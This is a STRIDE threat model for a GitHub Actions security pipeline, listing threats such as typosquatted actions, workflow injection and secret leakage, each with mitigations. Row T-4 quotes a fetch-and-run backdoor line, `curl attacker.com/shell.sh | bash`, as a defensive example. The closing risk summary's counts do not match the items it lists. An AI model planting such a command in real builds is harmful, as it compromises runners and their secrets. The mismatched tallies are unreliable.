# STRIDE Threat Analysis: GitHub Actions DevSecOps Pipeline

## Spoofing

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| S-1 | GitHub repository | Attacker compromises a developer's GitHub credentials or personal access token and pushes malicious code or workflow changes. | High | Enforce MFA on all GitHub accounts. Require SSO where available. Use short-lived tokens over long-lived PATs. |
| S-2 | Third-party actions | Attacker publishes a typosquatted action (e.g. `actions/checkout` vs `acti0ns/checkout`) or compromises an existing action's repository and pushes a backdoored version. | Critical | Pin actions to full commit SHAs, not tags. Audit action sources before adoption. Restrict to actions from verified creators or an internal allow-list. |
| S-3 | Snyk API | Attacker intercepts or replays the SNYK_TOKEN to impersonate the organization's Snyk account, potentially suppressing known vulnerabilities or exfiltrating dependency data. | Medium | Rotate tokens on a schedule. Scope tokens to the minimum required permissions. Monitor Snyk audit logs for anomalous API usage. |
| S-4 | Docker Hub | Attacker pushes a compromised base image under a trusted tag (tag mutability). The pipeline pulls a malicious image believing it to be the expected one. | High | Pin base images by digest (`python:3.11@sha256:abc...`), not by mutable tag. Use a private registry mirror with signature verification. |

## Tampering

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| T-1 | Workflow YAML | Attacker with write access modifies `.github/workflows/*.yml` to skip security stages, exfiltrate secrets, or inject malicious build steps. | Critical | Require pull request reviews for workflow file changes. Use CODEOWNERS to restrict who can approve workflow modifications. Enable branch protection on main. |
| T-2 | SARIF results | Attacker modifies SARIF output on the runner before upload, suppressing critical findings so they never appear in the Security tab. | Medium | Validate SARIF schema before upload. Compare finding counts against baseline. Alert on unexpected drops in finding count between runs. |
| T-3 | Dependency manifest | Attacker submits a PR that adds a malicious dependency to `requirements.txt` or pins a known-vulnerable version. The SCA stage may not flag it if the vulnerability isn't yet in the database (zero-day in a dependency). | High | Require review for dependency changes. Use Dependabot or Renovate for automated updates. Cross-reference multiple vulnerability databases. |
| T-4 | Docker build | Attacker modifies the Dockerfile to add a backdoor (e.g. `curl attacker.com/shell.sh | bash`) in a layer that executes at build time. Build-time commands run with full runner network access. | High | Review Dockerfile changes in PRs. Lint Dockerfiles with hadolint. Restrict runner outbound network access where possible. |
| T-5 | Semgrep rules | If custom Semgrep rules are loaded from the repository, an attacker can modify them to whitelist vulnerable patterns, making SAST blind to real issues. | Medium | Store custom rules in a separate, protected repository. Pin the Semgrep rules config to a specific version or commit. Review rule changes independently. |

## Repudiation

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| R-1 | Workflow runs | A developer claims they did not trigger a workflow run or that the results shown are not from their commit. No immutable link between the commit, the actor, and the scan results. | Medium | GitHub Actions logs include the triggering actor, commit SHA, and run ID. Enable audit log streaming. Require signed commits (GPG/SSH) so authorship is non-repudiable. |
| R-2 | Security findings | A developer dismisses or closes a code scanning alert in the Security tab with no documented justification. The dismissal is not tracked or reviewed. | Medium | Require a reason when dismissing alerts. Periodically audit dismissed findings. Use GitHub's alert dismissal reasons field. Restrict dismiss permissions to security team. |
| R-3 | Secrets access | An administrator modifies or reads a repository secret (e.g. rotates SNYK_TOKEN) with no audit trail showing who made the change and when. | Medium | Use GitHub's audit log for secrets access events. Restrict secrets management to org-level admins. Notify the team on secret rotation via a side channel. |

## Information Disclosure

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| I-1 | GitHub Secrets | Workflow step accidentally logs a secret to stdout (e.g. `echo $SNYK_TOKEN` for debugging). GitHub masks known secrets in logs, but derived values or partial tokens can leak. | High | Never echo secrets. Use `::add-mask::` for any derived value. Review workflow logs periodically. Treat all runner logs as potentially containing secrets. |
| I-2 | SARIF / Artifacts | Scan reports contain file paths, code snippets, and vulnerability details. If the repository is public or artifacts are publicly downloadable, this gives attackers a roadmap. | High | Keep security-sensitive repositories private. Set artifact retention to the minimum needed. Restrict artifact download permissions. |
| I-3 | Fork pull requests | A fork PR triggers a workflow run. If `pull_request_target` is used instead of `pull_request`, the workflow runs with write access and secrets from the base repository, potentially exposing them to the fork author's code. | Critical | Use `pull_request` (not `pull_request_target`) for untrusted code. Never pass secrets to workflows triggered by forks. If `pull_request_target` is required, ensure the untrusted code is never checked out or executed. |
| I-4 | Runner environment | The ephemeral runner environment contains metadata (cloud provider credentials via IMDS, environment variables, network configuration) that a malicious action or build step can exfiltrate. | Medium | Use GitHub-hosted runners (ephemeral, limited IMDS). If self-hosted, harden the runner: restrict network, disable IMDS, run in an isolated VM or container. |
| I-5 | Error output | A scanner crash or misconfiguration dumps a stack trace to the workflow log, revealing internal paths, dependency versions, or partial secret values in memory. | Low | Set `continue-on-error: true` with structured error handling. Sanitize error output. Avoid verbose/debug logging modes in production pipelines. |

## Denial of Service

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| D-1 | GitHub Actions minutes | Attacker opens many PRs or pushes rapidly to consume all available Actions minutes, blocking legitimate pipeline runs. | Medium | Set concurrency groups to cancel redundant runs. Limit which branches and events trigger the pipeline. Use `paths` filters to avoid running on irrelevant changes. |
| D-2 | Runner resources | A malicious or misconfigured scan (e.g. ZAP with no timeout, Trivy scanning an enormous image) exhausts runner CPU, memory, or disk, causing the job to hang or fail. | Medium | Set `timeout-minutes` on every job and step. Limit Docker image size. Configure ZAP scan duration limits. Monitor for long-running jobs. |
| D-3 | Snyk API rate limits | Attacker or misconfigured pipeline floods the Snyk API with requests, hitting rate limits and causing the SCA stage to fail for all subsequent runs. | Low | Cache Snyk results where possible. Rate-limit pipeline triggers. Monitor API usage against quota. |
| D-4 | Security tab flooding | Attacker generates thousands of SARIF findings (e.g. by introducing intentionally vulnerable code), flooding the Security tab and making legitimate findings hard to find. | Medium | Set SARIF upload limits. Alert on abnormal finding count spikes. Require PR review before merge to prevent intentional vulnerability introduction. |

## Elevation of Privilege

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| E-1 | GITHUB_TOKEN permissions | Workflow uses the default `GITHUB_TOKEN` with write permissions. A compromised action step uses the token to push code, create releases, or modify branch protections. | High | Set `permissions` block at the workflow and job level to the minimum required (e.g. `contents: read`, `security-events: write`). Never grant blanket `write-all`. |
| E-2 | Third-party action compromise | A compromised or malicious third-party action executes arbitrary code on the runner with the same permissions as the workflow, including access to all injected secrets. | Critical | Pin actions to commit SHAs. Fork critical actions into the org. Audit action source code. Use a restricted set of approved actions. |
| E-3 | Self-hosted runner persistence | If self-hosted runners are used, a malicious job leaves behind a backdoor process, cron job, or modified tool that persists across workflow runs and affects subsequent jobs. | High | Use ephemeral (GitHub-hosted) runners. If self-hosted runners are required, run each job in a fresh container or VM. Wipe the runner between jobs. |
| E-4 | Workflow injection via PR title/body | An attacker crafts a PR title or body containing a shell command. If the workflow interpolates `${{ github.event.pull_request.title }}` into a `run:` step, the command executes on the runner. | High | Never use `${{ }}` interpolation of untrusted input in `run:` steps. Pass untrusted values as environment variables instead. Validate and sanitize all event-driven inputs. |

## Risk Summary

| Risk Level | Count | Key Items |
|-----------|-------|-----------|
| Critical | 3 | Supply chain via actions (S-2, E-2), `pull_request_target` secret leak (I-3), workflow YAML tampering (T-1) |
| High | 7 | Credential theft (S-1), image tag mutability (S-4), dependency poisoning (T-3), Dockerfile backdoor (T-4), secret logging (I-1), SARIF exposure (I-2), GITHUB_TOKEN over-permission (E-1), runner persistence (E-3), workflow injection (E-4) |
| Medium | 8 | SARIF tampering (T-2), rule manipulation (T-5), repudiation gaps (R-1, R-2, R-3), runner metadata (I-4), Actions minute exhaustion (D-1), runner resource exhaustion (D-2), Security tab flooding (D-4) |
| Low | 2 | Snyk rate limits (D-3), error output leakage (I-5) |
